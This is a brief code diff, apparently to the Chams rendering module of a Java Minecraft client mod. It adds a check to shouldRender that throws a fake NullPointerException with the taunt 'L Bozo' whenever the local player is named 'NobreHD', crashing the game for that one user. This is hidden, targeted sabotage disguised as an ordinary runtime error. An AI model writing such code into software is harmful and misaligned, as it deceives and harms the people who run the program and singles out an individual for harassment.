@@ -211,6 +211,9 @@ public class Chams extends Module {
     }
 
     public boolean shouldRender(Entity entity) {
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
         return isActive() && !isShader() && entities.get().getBoolean(entity.getType()) && (entity != mc.player || ignoreSelfDepth.get());
     }
 
